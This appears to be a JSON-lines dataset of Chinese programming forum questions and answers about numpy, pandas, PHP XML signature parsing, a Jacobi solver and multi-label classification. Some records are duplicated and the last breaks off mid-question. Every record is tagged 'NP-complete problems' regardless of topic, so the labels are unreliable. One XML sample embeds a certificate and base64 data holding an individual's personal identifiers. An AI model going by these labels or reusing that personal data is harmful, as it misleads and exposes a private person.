{"Answer": "https://www.cnblogs.com/massquantity/p/8908859.html\r\n\r\naa = np.arange(10)\r\nnp.where(aa,1,-1)\r\n相当于\r\naa = np.arange(10)\r\nnp.where(aa != 0,1,-1)", "Konwledge_Point": "NP完全问题", "Question": "np.where这个函数不太理解\n\n\n\n\n\n\naa = np.arange(10)\n\nnp.where(aa,1,-1)\n\narray([-1,  1,  1,  1,  1,  1,  1,  1,  1,  1])  # 0为False，所以第一个输出-1\n\n\n\n\n\n\n\n\n\n疑问1，where函数的第一个参数为条件，把序列当成条件是什么意思？条件不是大于小于等这一类的吗？总之结果怎么来的\n\n\n\n\n\n\n\n\n\nnp.where([[True,False], [True,True]],\n\n             [[1,2], [3,4]],\n\n             [[9,8], [7,6]])\n\narray([[1, 8],\n\n       [3, 4]])\n\n\n\n\n\n\n\n\n\n疑问2，[[True,False], [True,True]]为条件，满足条件输出 [[1,2], [3,4]],不满足输出 [[9,8], [7,6]]。（where函数的用法是这样的），结果是怎么来的\n\n\n\n\n\n\n\n\n\nnp.where([[0, 1], [1, 0]])\n\n(array([0, 1]), array([1, 0]))\n\n上面这个例子条件中[[0,1],[1,0]]的真值为两个1，各自的第一维坐标为[0,1]，第二维坐标为[1,0] 。\n\n\n\n\n\n\n\n\n\n疑问3，这个结果和解释到底怎么来的\n\n\n\n\n\n\n\n\n\na = np.arange(27).reshape(3,3,3)\n\na\n\narray([[[ 0,  1,  2],\n\n        [ 3,  4,  5],\n\n        [ 6,  7,  8]],\n\n\n\n\n\n\n\n\n\n   [[ 9, 10, 11],\n    [12, 13, 14],\n    [15, 16, 17]],\n\n   [[18, 19, 20],\n    [21, 22, 23],\n    [24, 25, 26]]])\n\n\n\n\n\n\n\n\n\n\nnp.where(a > 5)\n\n(array([0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2]),\n\n array([2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2]),\n\n array([0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2]))\n\n\n\n\n\n\n\n\n\n疑问4  这个结果得到的索引值也是完全看不懂", "Tag": "算法分析"}
{"Answer": "https://www.cnblogs.com/massquantity/p/8908859.html\r\n\r\naa = np.arange(10)\r\nnp.where(aa,1,-1)\r\n相当于\r\naa = np.arange(10)\r\nnp.where(aa != 0,1,-1)", "Konwledge_Point": "NP完全问题", "Question": "np.where这个函数不太理解\n\n\n\n\n\n\naa = np.arange(10)\n\nnp.where(aa,1,-1)\n\narray([-1,  1,  1,  1,  1,  1,  1,  1,  1,  1])  # 0为False，所以第一个输出-1\n\n\n\n\n\n\n\n\n\n疑问1，where函数的第一个参数为条件，把序列当成条件是什么意思？条件不是大于小于等这一类的吗？总之结果怎么来的\n\n\n\n\n\n\n\n\n\nnp.where([[True,False], [True,True]],\n\n             [[1,2], [3,4]],\n\n             [[9,8], [7,6]])\n\narray([[1, 8],\n\n       [3, 4]])\n\n\n\n\n\n\n\n\n\n疑问2，[[True,False], [True,True]]为条件，满足条件输出 [[1,2], [3,4]],不满足输出 [[9,8], [7,6]]。（where函数的用法是这样的），结果是怎么来的\n\n\n\n\n\n\n\n\n\nnp.where([[0, 1], [1, 0]])\n\n(array([0, 1]), array([1, 0]))\n\n上面这个例子条件中[[0,1],[1,0]]的真值为两个1，各自的第一维坐标为[0,1]，第二维坐标为[1,0] 。\n\n\n\n\n\n\n\n\n\n疑问3，这个结果和解释到底怎么来的\n\n\n\n\n\n\n\n\n\na = np.arange(27).reshape(3,3,3)\n\na\n\narray([[[ 0,  1,  2],\n\n        [ 3,  4,  5],\n\n        [ 6,  7,  8]],\n\n\n\n\n\n\n\n\n\n   [[ 9, 10, 11],\n    [12, 13, 14],\n    [15, 16, 17]],\n\n   [[18, 19, 20],\n    [21, 22, 23],\n    [24, 25, 26]]])\n\n\n\n\n\n\n\n\n\n\nnp.where(a > 5)\n\n(array([0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2]),\n\n array([2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2]),\n\n array([0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2]))\n\n\n\n\n\n\n\n\n\n疑问4  这个结果得到的索引值也是完全看不懂", "Tag": "算法分析"}
{"Answer": "print一下train，里面看看为啥里面没有”ViolentCrimesPerPop” 这个key", "Konwledge_Point": "NP完全问题", "Question": "python中np.array的用法\nviolentcrimesperpop是表格中的一个参数，为什么是这个错误，完全看不懂啊。有没有大佬指导一下。源代码如下：\n\n\n\n\n\n\n\n\n\n \n\n\n\n ", "Tag": "算法分析"}
{"Answer": "print一下train，里面看看为啥里面没有”ViolentCrimesPerPop” 这个key", "Konwledge_Point": "NP完全问题", "Question": "python中np.array的用法\nviolentcrimesperpop是表格中的一个参数，为什么是这个错误，完全看不懂啊。有没有大佬指导一下。源代码如下：\n\n\n\n\n\n\n\n\n\n \n\n\n\n ", "Tag": "算法分析"}
{"Answer": "g_s_m.corr(g_a_d),类型转换一下\ng_s_m = pd.Series(era5_list，dtype=np.float64)\n ", "Konwledge_Point": "NP完全问题", "Question": "数据处理时出现'float' object has no attribute 'shape'怎么办？\n我在用Python处理气象数据时出现的问题。按照工作需要，我在对ERA5（下载链接：链接：\nhttps://pan.baidu.com/s/1alH1cLXOAGYMz67dPdoZ2w \n 提取码：\nc4b2\n ）和\nCRU_TS v4.04\n（下载链接：链接：\nhttps://pan.baidu.com/s/1c4IVFI-jetxuEThaCqml1g\n 提取码：\nw5r0 \n）的气温数据进行分析，计算\n相关系数（CC）\n，后面计算的代码来源于网络，前面的代码作用的统一经纬度分辨率（把ERA5经纬度统一成与CRU_TS v4.04一样的0.5度乘0.5度），现在确认在统一经纬度分辨率没有问题。\nCRU_TS v4.04\n没有海洋和南极地区的数据，所以存在\nNaN空值\n，在如下的代码运算之后，\n\n\n\n\n\nimport pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\nera5_list = t2m_xin\ncru_ts_list = tmp_new\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()\n\n\n\n报错：\n\n\n\nTraceback (most recent call last):\n\n  File \"G:\\Data_dispose\\CC.py\",\n line 37\n, in \n\n    corr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\series.py\", line 2327, in corr\n\n    return nanops.nancorr(\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 71, in _f\n\n    return f(*args, **kwargs)\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1459, in nancorr\n\n    return f(a, b)\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1480, in func\n\n    return np.corrcoef(a, b)[0, 1]\n\n  File \"<__array_function__ internals>\", line 5, in corrcoef\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2551, in corrcoef\n\n    c = cov(x, y, rowvar)\n\n  File \"<__array_function__ internals>\", line 5, in cov\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2456, in cov\n\n    avg, w_sum = average(X, axis=1, weights=w, returned=True)\n\n  File \"<__array_function__ internals>\", line 5, in average\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 415, in average\n\n    if scl.shape != avg.shape:\n\nAttributeError: \n'float' object has no attribute 'shape'\n\n\n\n随后，我用简单的数据类型转换，通过遍历列表里的数据，变成float类型数据，代码如下\n（第31-34行改动）\n，\n\n\n\n\n\nimport pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\ntmp_new_0 = []\nfor k in range(len(tmp_new)):\n    k = float(k)\n    tmp_new_0.append(k)\nera5_list = t2m_xin\ncru_ts_list = tmp_new_0\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()\n\n\n\n确实没有报错，但是\nCRU_TS v4.04\n的\n数据已经发生改变\n，结果完全不符合实际情况，如图：\n\n\n\n\n\n\n可以看出横坐标为ERA5的气温数据正常，纵坐标数据已经“废了”，为什么会这样？这么解决？刚入门编程不到半年的小白向大佬们请教。", "Tag": "算法分析"}
{"Answer": "g_s_m.corr(g_a_d),类型转换一下\ng_s_m = pd.Series(era5_list，dtype=np.float64)\n ", "Konwledge_Point": "NP完全问题", "Question": "数据处理时出现'float' object has no attribute 'shape'怎么办？\n我在用Python处理气象数据时出现的问题。按照工作需要，我在对ERA5（下载链接：链接：\nhttps://pan.baidu.com/s/1alH1cLXOAGYMz67dPdoZ2w \n 提取码：\nc4b2\n ）和\nCRU_TS v4.04\n（下载链接：链接：\nhttps://pan.baidu.com/s/1c4IVFI-jetxuEThaCqml1g\n 提取码：\nw5r0 \n）的气温数据进行分析，计算\n相关系数（CC）\n，后面计算的代码来源于网络，前面的代码作用的统一经纬度分辨率（把ERA5经纬度统一成与CRU_TS v4.04一样的0.5度乘0.5度），现在确认在统一经纬度分辨率没有问题。\nCRU_TS v4.04\n没有海洋和南极地区的数据，所以存在\nNaN空值\n，在如下的代码运算之后，\n\n\n\n\n\nimport pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\nera5_list = t2m_xin\ncru_ts_list = tmp_new\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()\n\n\n\n报错：\n\n\n\nTraceback (most recent call last):\n\n  File \"G:\\Data_dispose\\CC.py\",\n line 37\n, in \n\n    corr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\series.py\", line 2327, in corr\n\n    return nanops.nancorr(\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 71, in _f\n\n    return f(*args, **kwargs)\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1459, in nancorr\n\n    return f(a, b)\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1480, in func\n\n    return np.corrcoef(a, b)[0, 1]\n\n  File \"<__array_function__ internals>\", line 5, in corrcoef\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2551, in corrcoef\n\n    c = cov(x, y, rowvar)\n\n  File \"<__array_function__ internals>\", line 5, in cov\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2456, in cov\n\n    avg, w_sum = average(X, axis=1, weights=w, returned=True)\n\n  File \"<__array_function__ internals>\", line 5, in average\n\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 415, in average\n\n    if scl.shape != avg.shape:\n\nAttributeError: \n'float' object has no attribute 'shape'\n\n\n\n随后，我用简单的数据类型转换，通过遍历列表里的数据，变成float类型数据，代码如下\n（第31-34行改动）\n，\n\n\n\n\n\nimport pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\ntmp_new_0 = []\nfor k in range(len(tmp_new)):\n    k = float(k)\n    tmp_new_0.append(k)\nera5_list = t2m_xin\ncru_ts_list = tmp_new_0\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()\n\n\n\n确实没有报错，但是\nCRU_TS v4.04\n的\n数据已经发生改变\n，结果完全不符合实际情况，如图：\n\n\n\n\n\n\n可以看出横坐标为ERA5的气温数据正常，纵坐标数据已经“废了”，为什么会这样？这么解决？刚入门编程不到半年的小白向大佬们请教。", "Tag": "算法分析"}
{"Answer": "用pandas 试试\npd.set_option('display.max_columns', 1000) #显示完整的列pd.set_option('display.max_rows', None) #显示完整的行", "Konwledge_Point": "NP完全问题", "Question": "Python describe 显示不完全的问题要怎么解决\npython\n在Python中对数据框进行describe的时候，如果字段稍微多一些，则会将一些列自动省略掉，\n在网上查了一些方法，比如：\nimport numpy as np\n\n\nnp.set_printoptions(threshold=np.inf)\n但是对于describe无效\n使用转置也同样不行\n如何解决这个问题？图片说明\n或者有什么替代方案？\n谢谢！", "Tag": "算法分析"}
{"Answer": "\nThanks to the michi's comment, I found a solution. Namespaced nodes should be accessed differently than nodes without namespace.\nSo, basing on the example above, when I want to use Signature node, I can do it like this:\n$xml = simplexml_load_string($content);\n$signatureNode = $xml->children('ds', true)->Signature;\n\n", "Konwledge_Point": "NP完全问题", "Question": "sImplexml_load_string未完全加载XAdES-BES签名XML\n\n\n\nI've got XML containing XAdES-BES digita signature:\n\n\n\n\n\n\n\n\n\n\n\nZ7q3zqS5FTNPP/mj0rDmUV5PdZQ=\n\n\n\nH7EeV4pPoJ6WhWFnVSo3WNu3Yj8=\n\n\na0cc/hQYjmwQC8ssBzolLyArUqOVi+s6cP+lbxku69qGleBUroQlvD6o+GpIxSJB6wlWwic3YjuxDxn9\nmfW2jCLYEEM1RB277ChnHASakC+vbBP03LWC+GxsOe0seKMVsCc0EPwS5kk5RfvrUN6sTxWSW/2MOIXG\n4fW1cAtjh1SjDN9Ij38SIuWpW8guJ9EGEVyTUuTiZ5dbpHfxftgKfHmr16aMpXk0ta46X2UuGTQRB+E/\n0W+RpLqdmTP5VG0CxT8Z2H4n6puGL0yC20SsZZDethL/Vnr67EXTPmHFUwoZOGNu+0IFdBJW4HvLA5rF\nczL82MOsCoFXqzMVxGxiqw==\n\n\n\nAL4k+zz02RytjonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5\nbN6qGBQGsmdqkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJ\nP8/bo8Coj2EVtKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAo\nLc/CJiNsnsASws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjC\nFUq+MykmVvfW0D0bOTP2X5k=\nAQAB\n\n\n\nMIIGETCCBPmgAwIBAgIUaQ+g3SS0YfvHQus43mbJ+4FSYegwDQYJKoZIhvcNAQEFBQAwczELMAkGA1UE\nBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNVBAMMG0NP\nUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDYwHhcNMTUxMDA4MTIw\nMDAwWhcNMTYxMDA4MTIwMDAwWjB2MQswCQYDVQQGEwJQTDEbMBkGA1UEBRMSUEVTRUw6IDg2MDYxMzE0\nMzk3MR8wHQYDVQQDDBZLYW1pbCBTZWJhc3RpYW4gTWlqYWN6MRgwFgYDVQQqDA9LYW1pbCBTZWJhc3Rp\nYW4xDzANBgNVBAQMBk1pamFjejCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL4k+zz02Ryt\njonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5bN6qGBQGsmdq\nkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJP8/bo8Coj2EV\ntKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAoLc/CJiNsnsAS\nws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjCFUq+MykmVvfW\n0D0bOTP2X5kCAwEAAaOCApgwggKUMAwGA1UdEwEB/wQCMAAwggFPBgNVHSABAf8EggFDMIIBPzCCATsG\nCSqEaAGG9yMBATCCASwwgd0GCCsGAQUFBwICMIHQDIHNRGVrbGFyYWNqYSB0YSBqZXN0IG/Fm3dpYWRj\nemVuaWVtIHd5ZGF3Y3ksIMW8ZSB0ZW4gY2VydHlmaWthdCB6b3N0YcWCIHd5ZGFueSBqYWtvIGNlcnR5\nZmlrYXQga3dhbGlmaWtvd2FueSB6Z29kbmllIHogd3ltYWdhbmlhbWkgdXN0YXd5IG8gcG9kcGlzaWUg\nZWxla3Ryb25pY3pueW0gb3JheiB0b3dhcnp5c3rEhWN5bWkgamVqIHJvenBvcnrEhWR6ZW5pYW1pLjBK\nBggrBgEFBQcCARY+aHR0cDovL3d3dy5lbGVrdHJvbmljem55cG9kcGlzLnBsL2luZm9ybWFjamUvZG9r\ndW1lbnR5LWktdW1vd3kwCQYDVR0JBAIwADAhBgNVHREEGjAYgRZrYW1pbC5taWphY3pAZ21haWwuY29t\nMA4GA1UdDwEB/wQEAwIGQDCBsAYDVR0jBIGoMIGlgBTMQSp2mC5KehnakTbf2H85P9TCrqF3pHUwczEL\nMAkGA1UEBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNV\nBAMMG0NPUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDaCFH18c1x7\nvNOu01acH+WfGYiAcun0MEAGA1UdHwQ5MDcwNaAzoDGGL2h0dHA6Ly9lbGVrdHJvbmljem55cG9kcGlz\nLnBsL2NybC9jcmxfb3prNTIuY3JsMA0GCSqGSIb3DQEBBQUAA4IBAQAP0zddWprl5hpXiIiMGcC5D7ob\n/nj3wvfOUm0QCf7+ZEorfr6EC96B6F/cNtZ1wXtAQXkf5Zm3gPhbKXY6XWM2NDWadZrDV9zV75Ab06dQ\n5qmDfuMGTfPUdH3+QBmW7YnniWPCGuMzGNlP9DpZ45YrgRnwlsZSHMhX0HiEeDfYKAkGhIaJ7lcPlZrj\nzWBdhUOgYm06pYf8NEKVWzu808iIHIvCBot0ADcZ8ypxDyQsco/RSRGY0EO8FATCH3j2Oe/+7FGRjRQK\nXczBsKu6G8GQ6b/eGuWD7NNAuBX4UJu9jXRo9mzo7zKj01/SPfE4kHTHfHr9yi9BBkzAmaAxQpT5\n\n\n\n\n\n\n2015-12-08T13:37:16Z\n\n\n\n\n+6UE5SSks6Cn6++o8CAkSO/NMWk=\n\n\nserialNumber=Nr wpisu: 6,CN=COPE SZAFIR - Kwalifikowany,O=Krajowa Izba Rozliczeniowa S.A.,C=PL\n599792555331422089182929030726347827824527827432\n\n\n\n\n\n\nDokument w formacie xml [XML]\ntext/plain\nhttp://www.w3.org/2000/09/xmldsig#base64\n\n\n\n\n\nPFRyZXNjUGlzbWE+DQogIDxTeWduYXR1cmFBa3Q+QUJDWFlaMTIzPC9TeWduYXR1cmFBa3Q+DQogIDxQ\nb2RtaW90eT4NCiAgICA8UG9kbWlvdD4NCiAgICAgIDxPc29iYUZpenljem5hPg0KICAgICAgICA8SW1p\nZT5KYW51c3o8L0ltaWU+DQogICAgICAgIDxOYXp3aXNrbz5Ob3dhazwvTmF6d2lza28+DQogICAgICAg\nIDxPem5hY3plbmllPg0KICAgICAgICAgIDxQZXNlbD44OTEwMDEwMDYxNjwvUGVzZWw+DQogICAgICAg\nIDwvT3puYWN6ZW5pZT4NCiAgICAgIDwvT3NvYmFGaXp5Y3puYT4NCiAgICA8L1BvZG1pb3Q+DQogIDwv\nUG9kbWlvdHk+DQogIDxQb2RzdGF3YVByYXduYT4NCiAgICA8UG9kc3Rhd2E+UFBfMDA0PC9Qb2RzdGF3\nYT4NCiAgPC9Qb2RzdGF3YVByYXduYT4NCjwvVHJlc2NQaXNtYT4=\n\n\n\n\n\n\nWhen I load it with simplexml_load_string, var_dump shows:\n\n\n\nobject(SimpleXMLElement)#212 (1) {\n  [\"@attributes\"] => array(1) {\n    [\"Id\"] => string(39) \"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\"\n  }\n}\n\n\n\n\nThere's no nested nodes of \"Signatures\" data.\n\n\n\nHowever, when I remove \"ds\" namespaces from tags, it works great.\n\n\n\nHow can I get them without changing document?\n\n    ", "Tag": "算法分析"}
{"Answer": "```\r\n# -*- coding: utf-8 -*-\r\n \r\n#Jacobi迭代法 输入系数矩阵mx、值矩阵mr、迭代次数n、误差c(以list模拟矩阵 行优先)\r\n \r\ndef Jacobi(mx,mr,n=100,c=0.0001):\r\n    if len(mx) == len(mr):  #若mx和mr长度相等则开始迭代 否则方程无解\r\n        x = [] #迭代初值 初始化为单行全0矩阵\r\n        for i in range(len(mr)):\r\n            x.append([0])\r\n        count = 0 #迭代次数计数\r\n        while count < n:\r\n            nx = [] #保存单次迭代后的值的集合\r\n            for i in range(len(x)):\r\n                nxi = mr[i][0]\r\n                for j in range(len(mx[i])):\r\n                    if j!=i:\r\n                        nxi = nxi+(-mx[i][j])*x[j][0]\r\n                nxi = nxi/mx[i][i]\r\n                nx.append([nxi]) #迭代计算得到的下一个xi值\r\n            lc = [] #存储两次迭代结果之间的误差的集合\r\n            for i in range(len(x)):\r\n                lc.append(abs(x[i][0]-nx[i][0]))\r\n            if max(lc) < c:\r\n                return nx #当误差满足要求时 返回计算结果\r\n            x = nx\r\n            count = count + 1\r\n        return False #若达到设定的迭代结果仍不满足精度要求 则方程无解\r\n    else:\r\n        return False\r\n \r\n#调用 Jacobi(mx,mr,n=100,c=0.001) 示例\r\nmx = [[8,-3,2],[4,11,-1],[6,3,12]]\r\n \r\nmr = [[20],[33],[36]]\r\nprint(Jacobi(mx,mr,100,0.00001))\r\n\r\n```\r\nhttps://blog.csdn.net/cswfqxs_/article/details/84067711", "Konwledge_Point": "NP完全问题", "Question": "python 用雅可比方法求解稀疏矩阵，完全不会写，求助a\n\n\n\nimport numpy as np\n\ndef Jacobi(A, b, iter_n, initial_guess=0):\n\n    n = len(A)\n\n\n\nD = np.diag(A)\nR = A - np.diag(D)\nx_i = initial_guess * np.ones(n)\nfor i in range(iter_n):\n    print('x_',i,'=',x_i)\n    x_i = (b - R.dot(x_i)) / D\n\nreturn x_i\n\n\n\n\ndef A_ij(n):\n\n   A = np.empty((n, n))\n\n    for i in range(n):\n\n        A[i, i] = 2\n\n    for i in range(n-1):\n\n        A[i,i+1]=A[i+1,i]=1\n\n    return A\n\ndef b_i(n):\n\n    b=np.empty(n)\n\n    b[0]=1\n\n    b[n-1]=-1\n\n    return b\n\ndef x0(n):\n\n    return np.zeros(n)\n\nprint(Jacobi(A,b,100,x0))", "Tag": "算法分析"}
{"Answer": "我先确认个问题哈，train的行现在的物理含义是什么？一般来说，行代表样本，列表示特征。但如果是这样的话就是不对的，对样本的顺序进行打乱以后并不会改变分类器的效果，这个是需要对列的顺序进行打乱。比如昨天帖子里的from skmultilearn.problem_transform import ClassifierChain，本质上是先根据x预测y1，然后再根据x、y1预测y2，以此类推，所以需要对y的顺序进行重排。所以您先确认一下行与列的物理含义对不对，如果是对的话，我再看看别的问题。\nrow_rand = np.random.permutation(train)  # 打乱数据顺序（使链排序为随机）\nrow_rand_data = row_rand[..., 0:74]\nrow_rand_label = row_rand[..., 74:134]\n", "Konwledge_Point": "NP完全问题", "Question": "多标签分类模型循环问题\n问题遇到的现象和发生背景\n\n\n循环训练模型。我在循环训练模型的时候，随机打乱了训练数据，最后得到的结果都是一样的。我尝试单独运行5和10迭代次数，结果不一样。按理来说循环结果应该是不一样的，但是出现了结果完全相同的结果。\n\n\n问题相关代码，请勿粘贴截图\n\n\n\n\n\n\n# 随机选取训练集，并训练模型，并得到各个模型预测结果\n\ndef train_m(m):\n    